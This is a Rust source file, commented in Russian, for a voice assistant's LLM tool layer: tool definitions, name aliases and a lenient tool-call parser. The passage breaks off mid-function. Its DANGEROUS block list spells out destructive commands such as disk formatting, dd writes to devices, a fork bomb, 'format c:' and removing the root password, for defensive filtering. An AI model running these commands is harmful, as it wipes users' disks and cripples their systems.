//! Инструменты для LLM: shell, приложения, файлы, система, таймеры.
//! Модель сама решает что вызвать, движок выполняет и озвучивает результат.
//!
//! Поддерживаются macOS, Linux и Windows. Каждая команда имеет ветку
//! под конкретную ОС через cfg. Опасные команды блокируются на уровне
//! парсера и чёрного списка подстрок.

use crate::events::{EventTx, JarvisEvent};
use crate::paths;
use crate::text::fix_lookalikes;
use crate::tts::AudioMessage;
use serde_json::Value;
use std::path::Path;
use std::process::Command;
use std::sync::mpsc::Sender;
use std::time::Duration;

#[derive(Debug, Clone, PartialEq)]
pub enum ToolCall {
    Shell {
        cmd: String,
    },
    OpenApp {
        name: String,
    },
    /// Полностью закрыть приложение (в отличие от `Window { action: close }`,
    /// который закрывает только окно).
    QuitApp {
        name: String,
    },
    OpenUrl {
        url: String,
        /// Браузер, названный в просьбе («в сафари»). `None` — по умолчанию.
        browser: Option<String>,
    },
    OpenPath {
        path: String,
    },
    SetTimer {
        seconds: u64,
        label: Option<String>,
    },
    SetAlarm {
        seconds_from_now: u64,
        label: Option<String>,
    },
    AlarmStop,
    /// Открыть окно утилит Джарвиса. `tab` — "timer" | "stopwatch" | "calendar",
    /// None — вкладка по умолчанию.
    OpenUtils {
        tab: Option<String>,
    },
    CloseUtils,
    /// Проиграть анимацию сборки реактора («проиграй анимацию реактора»).
    PlayReactorIntro,
    SetVolume {
        percent: u8,
    },
    SetBrightness {
        percent: u8,
    },
    Screenshot,
    LockScreen,
    Sleep,
    Notify {
        title: String,
        body: String,
    },
    ClipboardRead,
    ClipboardWrite {
        text: String,
    },
    AppleScript {
        script: String,
    },
    SystemInfo,
    FileRead {
        path: String,
        /// С какой строки читать (1-based). `None` — с начала.
        offset: Option<usize>,
        /// Сколько строк вернуть. `None` — умолчание движка.
        limit: Option<usize>,
    },
    FileWrite {
        path: String,
        content: String,
    },
    /// Дописать в конец файла, не затирая содержимое.
    FileAppend {
        path: String,
        content: String,
    },
    /// Заменить фрагмент в файле. `old` должен встречаться ровно один раз,
    /// если не указан `all`.
    FileEdit {
        path: String,
        old: String,
        new: String,
        all: bool,
    },
    FileList {
        path: String,
    },
    /// Найти строки с текстом внутри файла или каталога.
    FileSearch {
        query: String,
        path: Option<String>,
        /// Сколько строк контекста вокруг совпадения.
        context: Option<usize>,
    },
    /// Найти файлы по маске имени.
    FileGlob {
        pattern: String,
        path: Option<String>,
    },
    /// Поставить задачу в задачник.
    TaskAdd {
        text: String,
    },
    /// Прочитать задачник голосом.
    TaskList,
    /// Закрыть задачу галочкой.
    TaskDone {
        id: usize,
    },
    /// Удалить задачу из задачника.
    TaskRemove {
        id: usize,
    },
    /// Взять задачу в работу: цикл LLM стартует с её текстом.
    TaskRun {
        id: Option<usize>,
    },
    /// Открыть файл задачника в редакторе.
    TaskOpen,
    /// Найти в интернете (нужно, чтобы узнать точный домен, а не угадать его).
    WebSearch {
        query: String,
    },
    TimerStop,
    /// Управление окнами приложений: развернуть, свернуть, закрыть, список.
    Window {
        action: String,
        app: Option<String>,
    },
    /// Ввод текста, клавиатурные сочетания и мышь в активном приложении.
    DesktopInput { action: crate::platform::desktop::DesktopAction },
    /// Пауза между действиями интерфейса (например, после запуска программы).
    Wait { seconds: u64 },
    /// Пользовательская команда из commands.toml по имени. Каталог команд с
    /// параметрами приходит в системном промпте; параметры подставляются в
    /// плейсхолдеры `{...}` в значении действия.
    RunCommand {
        name: String,
        args: std::collections::HashMap<String, String>,
    },
    /// Отправить сообщение через нативное приложение «Сообщения» (iMessage).
    SendMessage {
        to: String,
        text: String,
    },
    /// Новая заметка в нативном приложении «Заметки».
    AddNote {
        title: String,
        body: String,
    },
    /// Событие в нативном приложении «Календарь».
    CreateEvent {
        title: String,
        date: String,
        time: String,
    },
    /// Управление музыкой: `play`, `pause`, `stop`, `next`, `previous`.
    /// Цель выбирается на месте: нативная «Музыка» или играющая вкладка
    /// браузера (Яндекс Музыка, YouTube) — управление идёт туда, где звук.
    MusicControl {
        action: String,
    },
    /// Поручить GUI-агенту (Holo-3.1) задачу на экране: он видит пиксели,
    /// сам кликает/печатает/прокручивает и проверяет результат повторными
    /// скриншотами. Задачу и критерии формулировать по-английски.
    UiTask {
        task: String,
        /// Критерии успеха — по чему агент решит, что цель достигнута.
        success: Option<String>,
    },
    /// Спросить GUI-агента, что сейчас на экране (текстовое описание).
    ScreenLook {
        question: String,
    },
}

/// Блокируем только реально разрушительные команды. Всё остальное — на
/// усмотрение модели и пользователя.
const DANGEROUS: &[&str] = &[
    // `rm` с опасной целью ловит структурная проверка (tool_guard): подстрока
    // «rm -rf /» блокировала и безобидный `rm -rf /tmp/build`.
    "mkfs.",
    "mkfs ",
    "fdisk",
    "diskutil erasedisk",
    "diskutil zerodisk",
    "diskutil reformat",
    "dd if=/dev/zero",
    "dd if=/dev/random",
    "dd of=/dev/",
    "dd of=/dev/disk",
    "> /dev/disk",
    "> /dev/sda",
    ":(){:|:&};:",
    "chmod -r 777 /",
    "chown -r /",
    "passwd -d root",
    "format c:",
    "del /f /s /q c:\\",
    "rd /s /q c:\\",
];

fn is_dangerous(s: &str) -> bool {
    // Пробелы схлопываем: `rm  -rf  ~` раньше проходил мимо подстрок.
    let collapsed = s.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ");
    DANGEROUS.iter().any(|d| collapsed.contains(d)) || crate::tool_guard::is_destructive_shell(s)
}

/// Возвращает имя ОС для использования в системном промпте.
pub fn os_name() -> &'static str {
    if cfg!(target_os = "macos") {
        "macOS"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        "Unknown"
    }
}

/// macOS: часть инструментов опирается на AppleScript, osascript и open -a.
/// Нужно, чтобы промпт не обещал модели того, чего в этой сборке нет.
pub const fn is_macos() -> bool {
    cfg!(target_os = "macos")
}

// =========================================================================
// Разбор tool-вызова
// =========================================================================

/// Результат разбора ответа модели.
#[derive(Debug, Clone)]
pub enum ToolParse {
    /// Tool-блока нет — это обычный текст.
    None,
    /// Валидный вызов инструмента.
    Call(ToolCall),
    /// Tool-блок есть, но разобрать не удалось. Несёт причину для лога.
    Failed(String),
}

/// Приводит «сырое» имя инструмента к каноническому виду: нижний регистр,
/// пробелы/дефисы/точки → `_`. Работает и для кириллицы (`Открой` → `открой`).
fn normalize_name(raw: &str) -> String {
    raw.trim()
        .to_lowercase()
        .chars()
        .map(|c| if c.is_alphanumeric() { c } else { '_' })
        .collect::<String>()
        .trim_matches('_')
        .to_string()
}

/// Словарь синонимов: (алиас, каноническое имя). Модели часто сокращают
/// имена инструментов (`open` вместо `open_url`), поэтому держим таблицу.
const ALIASES: &[(&str, &str)] = &[
    // shell
    ("shell", "shell"),
    ("shell_command", "shell"),
    ("bash", "shell"),
    ("sh", "shell"),
    ("zsh", "shell"),
    ("run_shell", "shell"),
    // "run_command"/"run_cmd" теперь пользовательские команды из commands.toml
    // (см. алиасы ниже); shell зовётся строго "shell".
    ("command", "shell"),
    ("cmd", "shell"),
    ("command_line", "shell"),
    ("команда", "shell"),
    ("командная_строка", "shell"),
    ("выполнить", "shell"),
    // GUI-агент Holo-3.1
    ("ui_task", "ui_task"),
    ("gui_task", "ui_task"),
    ("ui_agent", "ui_task"),
    ("screen_task", "ui_task"),
    ("gui_агент", "ui_task"),
    ("экранная_задача", "ui_task"),
    ("screen_look", "screen_look"),
    ("look_at_screen", "screen_look"),
    ("describe_screen", "screen_look"),
    ("что_на_экране", "screen_look"),
    ("посмотри_экран", "screen_look"),
    // open_url
    ("open_url", "open_url"),
    ("openurl", "open_url"),
    ("open_link", "open_url"),
    ("open_website", "open_url"),
    ("open_site", "open_url"),
    ("open_web", "open_url"),
    ("browse", "open_url"),
    ("browse_url", "open_url"),
    ("go_to", "open_url"),
    ("goto", "open_url"),
    ("navigate", "open_url"),
    ("visit", "open_url"),
    ("website", "open_url"),
    ("url", "open_url"),
    ("открыть_сайт", "open_url"),
    ("открыть_ссылку", "open_url"),
    ("ссылка", "open_url"),
    // web_search
    ("web_search", "web_search"),
    ("search_web", "web_search"),
    ("websearch", "web_search"),
    ("search", "web_search"),
    ("search_internet", "web_search"),
    ("find_site", "web_search"),
    ("site_search", "web_search"),
    ("найти_сайт", "web_search"),
    ("найди_сайт", "web_search"),
    ("найти_в_интернете", "web_search"),
    ("поиск_в_интернете", "web_search"),
    ("поищи_в_интернете", "web_search"),
    ("ищи_в_интернете", "web_search"),
    ("найди_в_интернете", "web_search"),
    ("поиск_сайта", "web_search"),
    ("найти_адрес", "web_search"),
    ("найди_адрес", "web_search"),
    // open_app
    ("open_app", "open_app"),
    ("openapp", "open_app"),
    ("open_application", "open_app"),
    ("open_program", "open_app"),
    ("launch_app", "open_app"),
    ("run_app", "open_app"),
    ("start_app", "open_app"),
    ("app", "open_app"),
    ("application", "open_app"),
    ("открыть_приложение", "open_app"),
    ("запустить_приложение", "open_app"),
    ("приложение", "open_app"),
    ("программа", "open_app"),
    // quit_app: закрыть приложение целиком, а не его окно
    ("quit_app", "quit_app"),
    ("app_quit", "quit_app"),
    ("close_app", "quit_app"),
    ("quit_application", "quit_app"),
    ("close_application", "quit_app"),
    ("exit_app", "quit_app"),
    ("quit", "quit_app"),
    ("close", "quit_app"),
    ("закрой_приложение", "quit_app"),
    ("закрыть_приложение", "quit_app"),
    ("завершить_приложение", "quit_app"),
    ("заверши_приложение", "quit_app"),
    ("выйти_из_приложения", "quit_app"),
    ("выход_из_приложения", "quit_app"),
    ("закрой", "quit_app"),
    ("закрыть", "quit_app"),
    ("timer_stop", "timer_stop"),
    ("stop_timer", "timer_stop"),
    ("cancel_timer", "timer_stop"),
    // open_path
    ("open_path", "open_path"),
    ("open_folder", "open_path"),
    ("open_dir", "open_path"),
    ("open_directory", "open_path"),
    ("open_file", "open_path"),
    ("reveal", "open_path"),
    ("folder", "open_path"),
    ("path", "open_path"),
    ("папка", "open_path"),
    ("открыть_папку", "open_path"),
    // таймеры
    ("set_timer", "set_timer"),
    ("timer", "set_timer"),
    ("start_timer", "set_timer"),
    ("countdown", "set_timer"),
    ("таймер", "set_timer"),
    ("set_alarm", "set_alarm"),
    ("alarm", "set_alarm"),
    ("set_wakeup", "set_alarm"),
    ("wakeup", "set_alarm"),
    ("будильник", "set_alarm"),
    ("alarm_stop", "alarm_stop"),
    ("stop_alarm", "alarm_stop"),
    ("cancel_alarm", "alarm_stop"),
    ("выключи_будильник", "alarm_stop"),
    ("останови_будильник", "alarm_stop"),
    ("open_utils", "open_utils"),
    ("utils_open", "open_utils"),
    ("show_utils", "open_utils"),
    ("открой_утилиты", "open_utils"),
    ("покажи_утилиты", "open_utils"),
    ("close_utils", "close_utils"),
    ("utils_close", "close_utils"),
    ("закрой_утилиты", "close_utils"),
    ("play_reactor_intro", "play_reactor_intro"),
    ("reactor_intro", "play_reactor_intro"),
    ("animate_reactor", "play_reactor_intro"),
    ("проиграй_анимацию_реактора", "play_reactor_intro"),
    ("покажи_анимацию_реактора", "play_reactor_intro"),
    // система
    ("set_volume", "set_volume"),
    ("volume", "set_volume"),
    ("set_volume_level", "set_volume"),
    ("громкость", "set_volume"),
    ("set_brightness", "set_brightness"),
    ("brightness", "set_brightness"),
    ("set_screen_brightness", "set_brightness"),
    ("яркость", "set_brightness"),
    ("screenshot", "screenshot"),
    ("screen_shot", "screenshot"),
    ("take_screenshot", "screenshot"),
    ("make_screenshot", "screenshot"),
    ("screen_capture", "screenshot"),
    ("скриншот", "screenshot"),
    ("снимок_экрана", "screenshot"),
    ("lock_screen", "lock_screen"),
    ("screen_lock", "lock_screen"),
    ("lock", "lock_screen"),
    ("блокировка", "lock_screen"),
    ("sleep", "sleep"),
    ("sleep_computer", "sleep"),
    ("go_to_sleep", "sleep"),
    ("sleep_now", "sleep"),
    ("усыпить", "sleep"),
    ("system_info", "system_info"),
    ("sysinfo", "system_info"),
    ("get_system_info", "system_info"),
    ("os_info", "system_info"),
    ("system", "system_info"),
    ("системная_информация", "system_info"),
    // уведомления и буфер
    ("notify", "notify"),
    ("notification", "notify"),
    ("send_notification", "notify"),
    ("show_notification", "notify"),
    ("alert", "notify"),
    ("уведомление", "notify"),
    ("clipboard_read", "clipboard_read"),
    ("read_clipboard", "clipboard_read"),
    ("get_clipboard", "clipboard_read"),
    ("clipboard_get", "clipboard_read"),
    ("прочитать_буфер", "clipboard_read"),
    ("clipboard_write", "clipboard_write"),
    ("write_clipboard", "clipboard_write"),
    ("set_clipboard", "clipboard_write"),
    ("copy_to_clipboard", "clipboard_write"),
    ("clipboard_set", "clipboard_write"),
    ("записать_в_буфер", "clipboard_write"),
    // applescript
    ("applescript", "applescript"),
    ("apple_script", "applescript"),
    ("osascript", "applescript"),
    // файлы
    ("file_read", "file_read"),
    ("read_file", "file_read"),
    ("cat", "file_read"),
    ("прочитать_файл", "file_read"),
    ("file_write", "file_write"),
    ("write_file", "file_write"),
    ("save_file", "file_write"),
    ("file_save", "file_write"),
    ("create_file", "file_write"),
    ("записать_файл", "file_write"),
    ("сохранить_файл", "file_write"),
    ("file_append", "file_append"),
    ("append_file", "file_append"),
    ("append", "file_append"),
    ("дописать_файл", "file_append"),
    ("file_edit", "file_edit"),
    ("edit_file", "file_edit"),
    ("replace_in_file", "file_edit"),
    ("patch_file", "file_edit"),
    ("изменить_файл", "file_edit"),
    ("file_search", "file_search"),
    ("search_in_files", "file_search"),
    ("grep", "file_search"),
    ("find_in_files", "file_search"),
    ("найти_в_файлах", "file_search"),
    ("file_glob", "file_glob"),
    ("glob", "file_glob"),
    ("find_files", "file_glob"),
    ("найти_файлы", "file_glob"),
    // окна
    ("window", "window"),
    ("window_control", "window"),
    ("manage_window", "window"),
    ("control_window", "window"),
    ("resize_window", "window"),
    ("maximize", "window"),
    ("fullscreen", "window"),
    ("minimize", "window"),
    ("сверни", "window"),
    ("разверни", "window"),
    ("минимизируй", "window"),
    ("максимизируй", "window"),
    ("окно", "window"),
    ("окна", "window"),
    ("управление_окнами", "window"),
    ("развернуть_окно", "window"),
    ("развернуть", "window"),
    ("свернуть_окно", "window"),
    ("свернуть", "window"),
    ("закрыть_окно", "window"),
    ("окна_приложений", "window"),
    ("список_окон", "window"),
    ("file_list", "file_list"),
    ("list_files", "file_list"),
    ("list_dir", "file_list"),
    ("list_directory", "file_list"),
    ("dir_list", "file_list"),
    ("список_файлов", "file_list"),
    // пользовательские команды из commands.toml
    ("run_command", "run_command"),
    ("command_run", "run_command"),
    ("custom_command", "run_command"),
    ("user_command", "run_command"),
    ("run_user_command", "run_command"),
    ("run_cmd", "run_command"),
    ("выполнить_команду", "run_command"),
    // задачник
    ("task_add", "task_add"),
    ("add_task", "task_add"),
    ("new_task", "task_add"),
    ("create_task", "task_add"),
    ("todo", "task_add"),
    ("todo_add", "task_add"),
    ("note", "task_add"),
    ("задача", "task_add"),
    ("задачу", "task_add"),
    ("добавь_задачу", "task_add"),
    ("добавить_задачу", "task_add"),
    ("записать_задачу", "task_add"),
    ("добавь_заметку", "task_add"),
    ("task_list", "task_list"),
    ("list_tasks", "task_list"),
    ("tasks", "task_list"),
    ("todo_list", "task_list"),
    ("show_tasks", "task_list"),
    ("задачи", "task_list"),
    ("задачник", "task_list"),
    ("мои_задачи", "task_list"),
    ("покажи_задачи", "task_list"),
    ("task_done", "task_done"),
    ("done_task", "task_done"),
    ("complete_task", "task_done"),
    ("finish_task", "task_done"),
    ("task_complete", "task_done"),
    ("задача_выполнена", "task_done"),
    ("закрой_задачу", "task_done"),
    ("task_remove", "task_remove"),
    ("remove_task", "task_remove"),
    ("delete_task", "task_remove"),
    ("del_task", "task_remove"),
    ("удали_задачу", "task_remove"),
    ("task_run", "task_run"),
    ("run_task", "task_run"),
    ("start_task", "task_run"),
    ("do_task", "task_run"),
    ("take_task", "task_run"),
    ("выполни_задачу", "task_run"),
    ("взять_задачу", "task_run"),
    ("начни_задачу", "task_run"),
    ("task_open", "task_open"),
    ("open_tasks", "task_open"),
    ("show_taskbook", "task_open"),
    ("открой_задачник", "task_open"),
    // нативные приложения macOS
    ("send_message", "send_message"),
    ("message", "send_message"),
    ("send_imessage", "send_message"),
    ("imessage", "send_message"),
    ("отправить_сообщение", "send_message"),
    ("отправь_сообщение", "send_message"),
    ("сообщение", "send_message"),
    ("add_note", "add_note"),
    ("create_note", "add_note"),
    ("new_note", "add_note"),
    ("заметки", "add_note"),
    ("запиши_в_заметки", "add_note"),
    ("create_event", "create_event"),
    ("add_event", "create_event"),
    ("calendar_event", "create_event"),
    ("calendar", "create_event"),
    ("событие", "create_event"),
    ("создай_событие", "create_event"),
    ("встреча", "create_event"),
    ("music_control", "music_control"),
    ("music", "music_control"),
    ("музыка", "music_control"),
    ("player", "music_control"),
    ("музыка_управление", "music_control"),
    ("play_pause", "music_control"),
    // keyboard/mouse control
    ("desktop_input", "desktop_input"),
    ("type_text", "desktop_input"),
    ("press_key", "desktop_input"),
    ("hotkey", "desktop_input"),
    ("mouse_click", "desktop_input"),
    ("click", "desktop_input"),
    ("double_click", "desktop_input"),
    ("right_click", "desktop_input"),
    ("move_mouse", "desktop_input"),
    ("scroll_mouse", "desktop_input"),
    ("wait", "wait"),
];

/// Обобщённые имена, для которых инструмент определяется по аргументам:
/// `{"name":"open","args":{"url":"..."}}` → open_url, `{"name":"run",
/// "args":{"cmd":"..."}}` → shell и т.д.
const GENERIC_NAMES: &[&str] = &[
    "open",
    "open_it",
    "launch",
    "start",
    "run",
    "execute",
    "do",
    "action",
    "tool",
    "browser",
    "открыть",
    "запустить",
    "перейти",
    "выполнить_команду",
];

fn lookup_alias(norm: &str) -> Option<&'static str> {
    ALIASES.iter().find(|(a, _)| *a == norm).map(|(_, c)| *c)
}

/// Извлекает объект аргументов. Поддерживает:
/// * `{"name":..,"args":{..}}` — канонический вид;
/// * `{"name":..,"arguments":{..}}` / `input` / `parameters`;
/// * `{"name":..,"args":"{..}"}` — args как строка с JSON;
/// * `{"name":"open_url","url":".."}` — аргументы в плоском виде.
fn extract_args(v: &Value) -> Value {
    let mut out = serde_json::Map::new();

    // Плоские аргументы на верхнем уровне (кроме служебных полей).
    if let Value::Object(map) = v {
        for (k, val) in map {
            let nk = normalize_name(k);
            if matches!(
                nk.as_str(),
                "name" | "tool" | "arguments" | "input" | "parameters" | "args"
            ) {
                continue;
            }
            out.insert(nk, val.clone());
        }
    }

    // Вложенные аргументы имеют приоритет.
    let nested = ["args", "arguments", "input", "parameters"]
        .iter()
        .find_map(|k| v.get(*k));
    if let Some(val) = nested {
        let obj = match val {
            Value::Object(m) => Some(m.clone()),
            Value::String(s) => serde_json::from_str::<Value>(s)
                .ok()
                .and_then(|p| p.as_object().cloned()),
            _ => None,
        };
        if let Some(m) = obj {
            for (k, val) in &m {
                out.insert(normalize_name(k), val.clone());
            }
        }
    }

    Value::Object(out)
}

fn arg_str<'a>(args: &'a Value, keys: &[&str]) -> Option<&'a str> {
    keys.iter()
        .find_map(|k| args.get(*k))
        .and_then(|x| x.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
}

/// Число из числа или из строки-числа (`"50"` → 50).
fn arg_bool(args: &Value, keys: &[&str]) -> bool {
    keys.iter()
        .find_map(|k| args.get(*k))
        .is_some_and(|x| match x {
            Value::Bool(b) => *b,
            Value::Number(n) => n.as_u64().is_some_and(|v| v != 0),
            Value::String(s) => {
                matches!(
                    s.trim().to_lowercase().as_str(),
                    "true" | "1" | "yes" | "да"
                )
            }
            _ => false,
        })
}

fn arg_u64(args: &Value, keys: &[&str]) -> Option<u64> {
    keys.iter()
        .find_map(|k| args.get(*k))
        .and_then(|x| match x {
            Value::Number(n) => n.as_u64().or_else(|| {
                n.as_f64().and_then(|f| {
                    if f >= 0.0 && f.fract() == 0.0 {
                        Some(f as u64)
                    } else {
                        None
                    }
                })
            }),
            Value::String(s) => {
                let t = s.trim();
                t.parse::<u64>()
                    .ok()
                    .or_else(|| t.parse::<f64>().ok().map(|f| f as u64))
            }
            Value::Bool(b) => Some(*b as u64),
            _ => None,
        })
}

/// Секунды: принимает `seconds`/`sec`/`time`/`duration`, а также `minutes`.
fn arg_i32(args: &Value, keys: &[&str]) -> Option<i32> {
    keys.iter().find_map(|k| args.get(*k)).and_then(|value| match value {
        Value::Number(n) => n.as_i64().and_then(|v| i32::try_from(v).ok()),
        Value::String(s) => s.trim().parse::<i32>().ok(),
        _ => None,
    })
}

fn arg_string_array_or_split(args: &Value, keys: &[&str]) -> Option<Vec<String>> {
    let value = keys.iter().find_map(|k| args.get(*k))?;
    match value {
        Value::Array(items) => {
            let out: Vec<String> = items.iter().filter_map(|v| v.as_str().map(str::trim).filter(|s| !s.is_empty()).map(str::to_string)).collect();
            (!out.is_empty()).then_some(out)
        }
        Value::String(s) => {
            let out: Vec<String> = s.split(|c: char| c == '+' || c == ',' || c.is_whitespace())
                .map(str::trim).filter(|x| !x.is_empty()).map(str::to_string).collect();
            (!out.is_empty()).then_some(out)
        }
        _ => None,
    }
}

/// Длительность: часы + минуты + секунды суммируются, ноль отклоняется
/// (см. `tool_guard::duration_seconds`).
fn arg_seconds(args: &Value) -> Option<u64> {
    crate::tool_guard::duration_seconds(args)
}

/// Определяет канонический инструмент по имени и аргументам.
fn resolve_tool(name: &str, args: &Value) -> Option<&'static str> {
    let norm = normalize_name(name);
    if norm.is_empty() {
        return None;
    }
    if let Some(canonical) = lookup_alias(&norm) {
        return Some(canonical);
    }
    if !GENERIC_NAMES.contains(&norm.as_str()) {
        return None;
    }
    if arg_str(
        args,
        &["url", "link", "website", "site", "href", "адрес", "ссылка"],
    )
    .is_some()
    {
        Some("open_url")
    } else if arg_str(
        args,
        &["cmd", "command", "shell", "shell_command", "команда"],
    )
    .is_some()
    {
        Some("shell")
    } else if arg_str(
        args,
        &["app", "app_name", "application", "программа", "приложение"],
    )
    .is_some()
    {
        Some("open_app")
    } else if arg_str(args, &["path", "folder", "dir", "directory", "папка"]).is_some() {
        Some("open_path")
    } else if arg_str(args, &["name", "title", "имя"]).is_some() {
        Some("open_app")
    } else {
        None
    }
}

/// Разбирает ответ модели. Неизвестные/битые аргументы больше не приводят к
/// молчаливому `None`: возвращается `Failed` с причиной.
pub fn parse(text: &str) -> ToolParse {
    // Нативный формат Qwen `<tool_call>…</tool_call>` — тот же вызов.
    let canon = crate::tool_guard::canon_tags(text);
    let text: &str = &canon;
    if text.matches("<tool>").count() > 1 {
        eprintln!("⚠️ В ответе несколько tool-блоков: исполняется только первый");
    }
    let inner = match extract_tool_inner(text) {
        Ok(inner) => inner,
        Err(reason) => {
            // Нет `<tool>` вообще — это обычный текст, а не ошибка.
            if !text.contains("<tool>") {
                return ToolParse::None;
            }
            return ToolParse::Failed(reason);
        }
    };

    let v: Value = match serde_json::from_str(inner) {
        Ok(v) => v,
        Err(e) => return ToolParse::Failed(format!("битый JSON в tool-блоке: {e}")),
    };

    // Имя может быть в "name" или в "tool".
    let raw_name = ["name", "tool", "function", "action"]
        .iter()
        .find_map(|k| v.get(*k))
        .and_then(|x| x.as_str());
    let Some(raw_name) = raw_name else {
        return ToolParse::Failed("в tool-блоке нет поля name".into());
    };

    let mut args = extract_args(&v);
    // В причину (она уходит в события и логи) не тащим целиком содержимое
    // file_write/сообщений.
    let shown = short_err(&args.to_string(), 240);
    let Some(name) = resolve_tool(raw_name, &args) else {
        return ToolParse::Failed(format!("неизвестный инструмент «{raw_name}», args: {shown}"));
    };
    // У коротких имён (type_text, press_key, hotkey, click) тип действия
    // является самим именем инструмента. Поддерживаем их как удобные алиасы.
    if name == "desktop_input" && args.get("action").is_none() {
        let invoked = normalize_name(raw_name);
        if matches!(invoked.as_str(), "type_text" | "press_key" | "hotkey" | "mouse_click" | "click" | "double_click" | "right_click" | "move_mouse" | "scroll_mouse") {
            if let Some(map) = args.as_object_mut() {
                let action = match invoked.as_str() {
                    "mouse_click" => "click",
                    "move_mouse" => "move",
                    "scroll_mouse" => "scroll",
                    other => other,
                };
                map.insert("action".into(), Value::String(action.into()));
            }
        }
    }

    match build_call(name, &args) {
        Some(Ok(call)) => ToolParse::Call(call),
        Some(Err(reason)) => {
            ToolParse::Failed(format!("инструмент {name}: {reason}, args: {shown}"))
        }
        None => ToolParse::Failed(format!("инструмент {name} не поддерживается, args: {shown}")),
    }
}

/// Достаёт JSON из tool-блока. Закрывающий `</tool>` необязателен: генерация
/// часто останавливается ровно на `}}`, и токен может оборвать тег на `</`.
/// Поэтому при отсутствии тега берём первый сбалансированный JSON-объект.
fn extract_tool_inner(text: &str) -> Result<&str, String> {
    let Some(start) = text.find("<tool>") else {
        return Err("нет tool-блока".into());
    };
    let after = &text[start + "<tool>".len()..];
    if let Some(end) = after.find("</tool>") {
        return Ok(after[..end].trim());
    }
    if let Some(json) = balanced_json(after) {
        return Ok(json.trim());
    }
    Err("tool-блок не закрыт </tool> (ответ обрезан)".into())
}

/// Возвращает первый сбалансированный JSON-объект в строке (с учётом строк и
/// экранирования), либо `None`, если объект не закрыт.
fn balanced_json(s: &str) -> Option<&str> {
    let brace = s.find('{')?;
    let json = &s[brace..];
    let mut depth = 0i32;
    let mut in_str = false;
    let mut escaped = false;
    for (idx, c) in json.char_indices() {
        if in_str {
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == '"' {
                in_str = false;
            }
            continue;
        }
        match c {
            '"' => in_str = true,
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(&json[..idx + c.len_utf8()]);
                }
            }
            _ => {}
        }
    }
    None
}

/// Проверяет, что JSON внутри tool-блока уже закрыт и разбирается.
///
/// Используется для ранней остановки генерации: как только `{"name":...,
/// "args":{...}}` дописан, ждать конца ответа не нужно.
pub fn tool_json_complete(text: &str) -> bool {
    let canon = crate::tool_guard::canon_tags(text);
    let text: &str = &canon;
    let Some(start) = text.find("<tool>") else {
        return false;
    };
    let after = &text[start + "<tool>".len()..];
    match balanced_json(after) {
        Some(json) => serde_json::from_str::<Value>(json).is_ok(),
        None => false,
    }
}

/// Разбор с починкой: если генерация оборвалась на середине JSON (например по
/// лимиту токенов), закрываем скобки и тег, и только потом разбираем.
pub fn parse_lenient(text: &str) -> ToolParse {
    let canon = crate::tool_guard::canon_tags(text);
    let text: &str = &canon;
    let first = parse(text);
    if !matches!(first, ToolParse::Failed(_)) {
        return first;
    }
    // Оборванное посреди строки значение достраивать опасно: усечённый
    // `shell.cmd` или `file_write.content` — уже другая команда. Такие вызовы
    // исполняем только для безопасных инструментов (см. truncation_repair_ok).
    let cut_in_string = crate::tool_guard::ends_inside_string(text);
    // Незакрытый тег уже обрабатывается в extract_tool_inner, здесь чиним
    // именно недописанный JSON: строку и скобки.
    let base = strip_dangling_close(text);
    for suffix in [
        "}",
        "}}",
        "\"}}",
        "}}}",
        "\"}}}",
        "</tool>",
        "}}</tool>",
        "\"}}</tool>",
        "\",\"args\":{}}</tool>",
    ] {
        let repaired = format!("{base}{suffix}");
        match parse(&repaired) {
            ToolParse::Failed(_) => continue,
            ToolParse::Call(call) if cut_in_string && !truncation_repair_ok(&call) => {
                return ToolParse::Failed(format!(
                    "ответ оборван внутри значения: {} не исполняю достроенным",
                    tool_name(&call)
                ));
            }
            other => return other,
        }
    }
    first
}

/// Инструменты, которые безопасно выполнить с достроенным обрывком: чтение,
/// поиск и открытие ссылки (адрес всё равно сверяется с выдачей поиска).
fn truncation_repair_ok(call: &ToolCall) -> bool {
    matches!(
        call,
        ToolCall::OpenUrl { .. }
            | ToolCall::WebSearch { .. }
            | ToolCall::FileRead { .. }
            | ToolCall::FileList { .. }
            | ToolCall::FileSearch { .. }
            | ToolCall::FileGlob { .. }
            | ToolCall::ScreenLook { .. }
            | ToolCall::SystemInfo
            | ToolCall::ClipboardRead
    )
}

/// Разбор «натурального» вызова, который модель печатает текстом (uzu не умеет
/// prefill, поэтому Qwen выдаёт свои нативные `web_search {"query":"..."}` без
/// обёртки `<tool>`). Принимаем ТОЛЬКО когда весь ответ — ровно один такой
/// вызов с известным инструментом; иначе это обычный текст и трогать его нельзя.
pub fn parse_bare(text: &str) -> ToolParse {
    let trimmed = text.trim();
    let Some(brace) = trimmed.find('{') else {
        return ToolParse::None;
    };
    let name = trimmed[..brace]
        .trim()
        .trim_end_matches(|c: char| c == '(' || c == ':' || c.is_whitespace())
        .trim();
    if name.is_empty() || name.contains(char::is_whitespace) {
        return ToolParse::None;
    }
    let after = &trimmed[brace..];
    let Some(obj) = balanced_json(after) else {
        return ToolParse::None;
    };
    // После JSON — только пустота/пунктуация: «web_search {...} — нашёл» не вызов.
    let tail = after[obj.len()..]
        .trim_matches(|c: char| c.is_whitespace() || matches!(c, '.' | ',' | ';' | ')' | '('));
    if !tail.is_empty() {
        return ToolParse::None;
    }
    let canonical = format!("<tool>{{\"name\":\"{name}\",\"args\":{obj}}}</tool>");
    match parse_lenient(&canonical) {
        ToolParse::Call(call) => ToolParse::Call(call),
        _ => ToolParse::None,
    }
}

/// Убирает хвостовой обрывок закрывающего тега (`<`, `</`, `</t`, …, `</tool`).
fn strip_dangling_close(text: &str) -> &str {
    const TAG: &str = "</tool>";
    for len in (1..TAG.len()).rev() {
        if text.ends_with(&TAG[..len]) {
            return &text[..text.len() - len];
        }
    }
    text
}

/// Срезает все tool-блоки из текстового ответа.
///
/// Модель 2B иногда прикладывает к обычному текстовому ответу выдуманный
/// или битый `<tool>`-блок (даже когда вопрос не про действие) — в чате и
/// озвучке сырой JSON не нужен. Незакрытый блок режется вместе с хвостом.
pub fn strip_tool_blocks(text: &str) -> String {
    let canon = crate::tool_guard::canon_tags(text);
    let text: &str = &canon;
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(start) = rest.find("<tool>") {
        out.push_str(&rest[..start]);
